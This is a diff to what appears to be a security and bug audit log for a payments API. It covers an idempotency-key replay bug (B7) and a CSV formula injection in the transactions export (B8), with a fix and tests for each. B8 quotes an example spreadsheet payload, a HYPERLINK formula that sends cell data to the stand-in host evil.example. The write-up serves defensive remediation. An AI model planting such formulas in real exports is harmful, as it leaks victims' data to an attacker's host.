@@ -69,3 +69,11 @@
 - What it breaks: a merchant integration that reuses a key (for example the order number, or a fixed key in a retry loop) captures transaction A, then "captures" transaction B with the same key. B is not captured, but the API replays A's 200 response. The merchant believes B was charged and ships the goods; B's authorization later expires and the merchant is never paid.
 - Fix: the hash now includes `transactionId`. The same key on another transaction returns 422 `idempotency_key_reused` (the existing rule for a changed request). A true retry on the same transaction still replays. Side effect: a capture retry whose first attempt was stored before this deploy gets 422 once (hash shape changed); it can be retried with a new key.
 - Test: apps/api/src/payments/capture.fix.test.ts "B7: the same Idempotency-Key on a different transaction does not replay the first capture" (was 200 replay of transaction A).
+
+### B8 CSV formula injection in the transactions export
+- Severity: Medium (security) / Ticket: none / Where: apps/api/src/transactions/exportCsv.ts:12 (`csvEscape`)
+- What is wrong: the merchant's free-text `reference` goes into the CSV as it is. A value that starts with `=`, `+`, `-`, `@`, tab or CR is not neutralised.
+- Why it happens: `csvEscape` only handles commas, quotes and newlines (CSV syntax). It does not think about how Excel or Google Sheets read the cell. They treat a cell that starts with one of those characters as a formula.
+- What it breaks: a merchant (or anyone who can set an order reference through the API) sets the reference to `=HYPERLINK("http://evil.example/?x="&A1,"Click")`. Finance downloads the export and opens it in Excel. The cell becomes a live link that can send other cells' data out, or other formulas can run. The attacker controls the data, and a trusted person opens it.
+- Fix: `csvEscape` puts a single quote in front of any text cell that starts with `= + - @`, tab or CR (OWASP guidance), and also quotes cells that contain a CR. Only text fields use `csvEscape`. The amount columns come from `formatBhd` and stay plain numbers (`12.345`). Normal references (`order-42`) do not change.
+- Test: apps/api/src/transactions/exportCsvInjection.fix.test.ts "B8: formula-like references are prefixed with a quote; amounts and normal references are unchanged".
